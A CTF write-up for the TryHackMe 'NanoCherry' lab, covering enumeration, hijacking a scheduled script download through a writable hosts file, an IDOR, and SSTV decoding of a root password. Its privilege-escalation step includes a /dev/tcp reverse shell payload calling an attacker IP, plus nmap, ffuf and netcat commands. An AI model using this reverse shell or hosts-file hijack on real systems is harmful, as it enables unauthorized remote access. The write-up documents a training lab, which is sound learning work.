NanoCherry CTF – TryHackMe Writeup

Overview

NanoCherry is a Capture The Flag (CTF) challenge on TryHackMe that focuses on web exploitation, enumeration, and privilege escalation. The goal is to move through multiple user accounts and finally obtain root access by combining discovered keys and exploiting system misconfigurations.

This writeup documents the methodology used to enumerate the target, escalate privileges between users, and finally gain root access.

⸻

1. Initial Enumeration

The first step was performing a port scan using Nmap to identify running services.

nmap -sC -sV <TARGET-IP>

The scan revealed two open ports:
	•	22 – SSH
	•	80 – HTTP

The challenge instructions required resolving the domain locally, so the following entry was added to the hosts file:

/etc/hosts

<TARGET-IP> cherryontop.thm


⸻

2. Initial Access (User: notsus)

The challenge provided SSH credentials:

Username: notsus
Password: dontbeascriptkiddie

Login:

ssh notsus@<TARGET-IP>

After logging in, enumeration was performed using LinPEAS.

./linpeas.sh

One important finding was:

/etc/hosts is writable

This opened the possibility of redirecting domains to attacker-controlled infrastructure.

⸻

3. Privilege Escalation – Bob-boba

Process monitoring was performed using pspy to detect scheduled or automated tasks.

./pspy32

This revealed that user bob-boba periodically downloads and executes a script:

cherryontop.tld:8000/home/bob-boba/conflip.sh

Attack Strategy

Because /etc/hosts was writable, the domain could be redirected to the attacker machine.

Add attacker IP to /etc/hosts:

<ATTACKER-IP> cherryontop.tld

Preparing Malicious Script

Create the expected directory structure:

mkdir -p home/bob-boba

Create the malicious script:

nano home/bob-boba/coinflip.sh

Reverse shell payload:

sh -i >& /dev/tcp/<ATTACKER-IP>/9001 0>&1

Start a web server:

python3 -m http.server 8000

Start listener:

nc -lvnp 9001

Once the scheduled task executed, the reverse shell connected back, giving access as:

bob-boba

From this account, Chad’s key3 was obtained.

⸻

4. Web Enumeration – Molly

Further enumeration of the web application revealed a hint suggesting to look for subdomains.

Subdomain fuzzing was performed using ffuf:

ffuf -u http://cherryontop.thm \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-H "Host: FUZZ.cherryontop.thm" \
-fs 1396

Discovered subdomain:

nano.cherryontop.thm

Add to hosts file:

<TARGET-IP> nano.cherryontop.thm


⸻

5. Directory Enumeration

Directory fuzzing identified a database file:

nano.cherryontop.thm/users.db

This file contained credentials for the admin portal.

Using these credentials allowed login to the admin dashboard, which revealed:
	•	Molly’s dashboard
	•	SSH password for Molly

Login:

ssh molly@<TARGET-IP>

Inside Molly’s account, Chad’s key1 was discovered.

⸻

6. Exploiting IDOR – Sam-sprinkles

Further enumeration of the main site revealed an Ice-Cream Fact page vulnerable to IDOR (Insecure Direct Object Reference).

The request format:

http://cherryontop.thm/content.php?facts=ID&user=BASE32VALUE

The user parameter was Base32 encoded.

Using Burp Suite Intruder, the facts parameter was fuzzed.

Eventually this request revealed credentials for another user:

facts=43
user=ONQW2LLTOBZGS3TLNRSXG===

This corresponded to:

sam-sprinkles

SSH login:

ssh sam-sprinkles@<TARGET-IP>

This account contained Chad’s key2.

⸻

7. Chad Account Access

The challenge required combining the three discovered keys:
	•	key1 (Molly)
	•	key2 (Sam-sprinkles)
	•	key3 (Bob-boba)

Using these keys allowed access to the Chad-cherry account, where the main flag was retrieved.

⸻

8. Root Privilege Escalation

Inside Chad’s account, a suspicious audio file was found:

rootPassword.wav

The audio appeared to contain an SSTV (Slow Scan Television) signal, which encodes images inside sound.

Using an SSTV decoding tool:

https://github.com/colaclanth/sstv

The audio was decoded into a PNG image.

The image contained the root password.

⸻

9. Root Access

Using the recovered password:

su root

Root login was successful, allowing retrieval of the root flag.

⸻

Conclusion

The NanoCherry CTF demonstrates several important cybersecurity concepts:
	•	Service enumeration
	•	Subdomain discovery
	•	Directory fuzzing
	•	Exploiting IDOR vulnerabilities
	•	Privilege escalation through scheduled tasks
	•	Host file manipulation
	•	Reverse shell exploitation
	•	SSTV signal decoding

By chaining together multiple vulnerabilities and performing detailed enumeration, full system compromise and root access were achieved.
